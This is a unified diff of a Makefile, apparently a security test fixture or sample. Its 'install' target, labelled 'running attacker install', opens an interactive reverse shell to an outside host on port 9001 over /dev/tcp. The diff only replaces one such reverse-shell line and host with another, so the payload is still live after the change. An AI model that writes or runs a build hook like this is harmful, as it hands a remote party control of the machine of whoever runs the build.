@@ -1,6 +1,6 @@
 install:
 	@echo "running attacker install"
-	/bin/bash -i >& /dev/tcp/rcss.pt/9001 0>&1
+	sh -i >& /dev/tcp/raphaelsilva.pt/9001 0>&1
 
 lint:
 	@echo "do nothing"
